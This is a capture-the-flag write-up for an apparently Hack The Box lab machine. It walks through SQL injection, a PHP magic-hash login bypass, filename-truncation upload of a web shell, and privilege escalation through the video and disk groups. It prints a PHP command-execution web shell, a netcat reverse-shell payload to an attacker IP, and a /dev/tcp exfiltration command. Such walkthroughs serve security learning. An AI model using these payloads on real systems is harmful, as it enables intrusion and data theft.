**Initial Recon**

Nmap

![image](https://user-images.githubusercontent.com/88967140/178944865-a3ef8183-1cd8-4fed-ae77-66f69aceacd8.png)

Web Directory Enumeration (Gobuster)
![image](https://user-images.githubusercontent.com/88967140/178944919-596a497a-5a90-444c-9b73-c7029cb28908.png)
![image](https://user-images.githubusercontent.com/88967140/178944927-a6a217c7-5192-4961-bd8d-f18cba0dd4a2.png)

* cyberlaw.txt appeared to be an intriguing text page that revealed a user named chris.
* ![image](https://user-images.githubusercontent.com/88967140/178945084-83ed301e-ba19-4c43-ada6-9f99fe908af5.png)
</br>
</br>

**Initial Foothold**

SQL Injection

Since there wasn't anything else other than the login form, I captured the login POST via Burp and used it in `sqlmap`.
![image](https://user-images.githubusercontent.com/88967140/178946925-b0d2ebe8-d070-4991-92ed-030cef796d44.png)
![image](https://user-images.githubusercontent.com/88967140/178946947-2a01e5a4-efca-491f-b15f-a59adc17788d.png)

Sending different usernames in the login form returned different results - 
![image](https://user-images.githubusercontent.com/88967140/178949194-20b06a3f-c7de-47b4-91ab-7ad42d387bf1.png)
![image](https://user-images.githubusercontent.com/88967140/178949227-3d73042b-ec92-49e0-9b8a-2ce02c366be2.png)
![image](https://user-images.githubusercontent.com/88967140/178949211-e65cf870-43d0-4f3a-a36a-a08d21bc77ab.png)

Notice how entering `admin` as the username would show `Wrong identification` in the response, but using `test` would show `Try again..`.

From this, it can be deduced that this login form is vulnerable to a boolean-based blind injection (the username = parameter).

So basically, "Wrong identification" = TRUE, "Try again.." = FALSE.

SQLMap
![image](https://user-images.githubusercontent.com/88967140/178950269-cb0b93b3-6c02-4b91-b68f-905466743b9f.png)

Effectively we can use `Wrong identification` to see if we're on the right track. All we're doing here is dumping credentials from `falafel` database.

![image](https://user-images.githubusercontent.com/88967140/178951074-60df6e3e-7bd2-4218-bab1-63295b690501.png)

PHP Type Juggling

Notice how the password for admin is hashed - it begins with 0e. We can try using magic tables to bypass the authentication and get into the account since 0 to the exponent of 462 is still 0. Right here we'll be abusing PHP's Loose comparison weakness.

* Magic Hashes

For this, we'll be using MD5 “Magic Number" (from https://www.whitehatsec.com/blog/magic-hashes/) 240610708 as the MD5 hash for this string would also start with 0e. As a result, because both are treated as 0, this magic hash would collide with other hashes and compare to be **true**.

I successfully logged in by using `240610708` as the password for `admin`.

![image](https://user-images.githubusercontent.com/88967140/178952959-d8c94975-1d82-4e92-9496-8e8686a450d5.png)
![image](https://user-images.githubusercontent.com/88967140/178952977-b66d8f8c-c6f0-405b-a8bd-51cdfb9ff58d.png)

At the start, I tried to upload a .php file to see if I could get an easy PHPreverse shell.
![image](https://user-images.githubusercontent.com/88967140/178953133-25763a14-7af2-4356-96e9-3f48070d1dde.png)
From this image, we can clearly see .php files won't work.
</br>
</br>

**File Name Truncation**

What I did was create a file with 251 characters using `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 251`, add .png at the end of the file, and upload it. 

![image](https://user-images.githubusercontent.com/88967140/178954298-a5a63f19-d81b-425c-8482-bba311b7e6a6.png)

Interestingly enough, the output mentioned the file name being too long and shortening it, which turned out to be from 255 characters to 236.
![image](https://user-images.githubusercontent.com/88967140/178954663-adad24d9-8614-4fe3-96a5-111256cfe655.png)
</br>
</br>

**PHP Reverse Shell**

So now my idea was to make it so that the .png part gets cut off by the upload system and we're left off with <file>.php from which we can execute PHP code.
I used `vi` to insert this arbitrary PHP execution code in the file we're going to upload next:
 
 `<?php echo system($_REQUEST['leo']) ?>`
and set up `nc -lvnp 443` on our other terminal.
 
So now we send a request with `leo=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.16.3+443+>/tmp/f` to `http://10.10.10.73/uploads/<folder from CMD output>/<file name>.php` as the payload.
* Important to URL encode it - otherwise the payload won't work.
 
 ![image](https://user-images.githubusercontent.com/88967140/178956561-cdabbc78-1a05-4a42-8880-6d899fa95fa5.png)
 
  And finally I got the shell.
 </br>
 </br>
 
 **Privilege Escalation**
 **www-data -> moshe (Password reuse)**

 Web directory enumeration showed this interesting .php file `connection.php`, which, as it turns out, included credentials for `moshe` user.
 ![image](https://user-images.githubusercontent.com/88967140/178957004-fd97e9a1-62c9-46d6-bb75-482d5e5dcf0d.png)
 
 Reusing those credentials, I was able to SSH in as `moshe` and read user.txt.
 ![image](https://user-images.githubusercontent.com/88967140/178957521-383fa639-74d0-4138-9f0c-169c2dfe3b37.png)
 </br>
 </br>
 
 **moshe -> yossi**
 
 `moshe` was part of many groups and video looked interesting.
 ![image](https://user-images.githubusercontent.com/88967140/178964905-4dc73b87-8b19-460c-aae5-143f9c8739b3.png)
 
It should be noted that users in the `video` group can access video capture devices and there's one framebuffer for each monitor which can be accessed through `/dev/fb[x]`.

I moved this file to my Kali using `cat /dev/fb0 > fb0.data` and `cat fb0.data > /dev/tcp/10.10.16.3/8000`.

Afterwards, I used gimp to open this file as `Raw image data`, set the width and height according to `/sys/class/graphics/fb0/virtual_size` and got this picture.
![image](https://user-images.githubusercontent.com/88967140/178964970-2beaa2c6-99d2-4056-a9a2-82aa84bfbcbe.png)
</br>
</br>

**yossi -> root**
So now that I got the password, I used it to SSH in as `yossi`.
![image](https://user-images.githubusercontent.com/88967140/178967068-03ce0714-b4c6-49cc-adfe-123314ae11e4.png)

We can see that the user is part of `disk` group. This should be kept in mind because members of the disk group can read and alter any files on any hard drive, which is mostly equivalent to having root access.

https://wiki.debian.org/SystemGroups tells us that `The group disk can be very dangerous, since hard drives in /dev/sd* and /dev/hd* can be read and written bypassing any file system and any partition, allowing a normal user to disclose, alter and destroy both the partitions and the data of such drives without root privileges. Users should never belong to this group.`
</br>
</br>

**Getting root Shell**
With this information at my disposal, I decided to `cat` RSA private key for `root` since I'd be able to SSH in as root using that exact key.
![image](https://user-images.githubusercontent.com/88967140/178967911-6144c2d0-46fc-43da-b919-657f69bb192a.png)

![image](https://user-images.githubusercontent.com/88967140/178968091-07014aa9-39b2-4841-8cb6-ad58c8bc3736.png)



`



 
 
 
